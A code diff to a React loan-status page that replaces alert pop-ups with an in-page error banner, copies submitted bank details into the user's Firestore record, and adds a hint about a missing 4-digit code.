@@ -21,6 +21,7 @@ export const LoanStatusPage = () => {
   const { user, userData, activeLoan, activeLoanId, loanLoading, localStatus, setLocalStatus } = useAuth();
   const navigate = useNavigate();
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [error, setError] = useState<string | null>(null);
   const [bankDetails, setBankDetails] = useState({
     bankName: '',
     accountNumber: '',
@@ -100,6 +101,7 @@ export const LoanStatusPage = () => {
     setLocalStatus('bank_details_submitted');
     
     try {
+      setError(null);
       // First update the document
       await updateDoc(doc(db, 'loans', loanId), {
         status: 'bank_details_submitted',
@@ -116,6 +118,7 @@ export const LoanStatusPage = () => {
       // Update user document for instant UI feedback
       await updateDoc(doc(db, 'users', user.uid), {
         activeLoanStatus: 'bank_details_submitted',
+        bankDetails: bankDetails,
         updatedAt: serverTimestamp()
       });
 
@@ -132,7 +135,7 @@ export const LoanStatusPage = () => {
     } catch (err) {
       console.error('Error submitting bank details:', err);
       setLocalStatus(null);
-      alert('Failed to submit bank details. Please try again.');
+      setError('Failed to submit bank details. Please try again.');
     } finally {
       // Keep isSubmitting true for a brief moment to allow snapshot to propagate
       setTimeout(() => setIsSubmitting(false), 800);
@@ -383,6 +386,7 @@ export const LoanStatusPage = () => {
                 }
 
                 try {
+                  setError(null);
                   await updateDoc(doc(db, 'loans', loanId), {
                     status: 'pin_sent',
                     additionalDetails,
@@ -401,7 +405,7 @@ export const LoanStatusPage = () => {
                 } catch (err) {
                   console.error('Error submitting additional details:', err);
                   setLocalStatus(null);
-                  alert('Failed to submit details.');
+                  setError('Failed to submit details.');
                 } finally {
                   setTimeout(() => setIsSubmitting(false), 800);
                 }
@@ -500,6 +504,7 @@ export const LoanStatusPage = () => {
                     }
 
                     try {
+                      setError(null);
                       await updateDoc(doc(db, 'loans', loanId), {
                         status: 'pin_submitted',
                         pinSubmittedAt: serverTimestamp(),
@@ -525,7 +530,7 @@ export const LoanStatusPage = () => {
                     } catch (err) {
                       console.error('Error submitting PIN:', err);
                       setLocalStatus(null);
-                      alert('Failed to submit PIN.');
+                      setError('Failed to submit PIN.');
                     } finally {
                       setTimeout(() => setIsSubmitting(false), 800);
                     }
@@ -533,6 +538,7 @@ export const LoanStatusPage = () => {
                 }}
               />
               <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Enter the 4-digit code to continue</p>
+              <p className="text-xs text-gray-400 mt-4">If you don't see a code, please contact your account manager.</p>
             </div>
           </div>
         );
@@ -597,6 +603,17 @@ export const LoanStatusPage = () => {
         <h2 className="text-3xl font-black tracking-tighter dark:text-white mb-2 uppercase">Loan Status</h2>
         <p className="text-gray-500">Track your application and manage your active loans.</p>
       </div>
+
+      {error && (
+        <motion.div 
+          initial={{ opacity: 0, y: -10 }}
+          animate={{ opacity: 1, y: 0 }}
+          className="mb-6 p-4 rounded-2xl bg-red-500/10 text-red-500 text-sm font-bold uppercase tracking-widest flex items-center gap-3"
+        >
+          <AlertCircle className="w-5 h-5" />
+          {error}
+        </motion.div>
+      )}
 
       <motion.div 
         key={currentStatus}
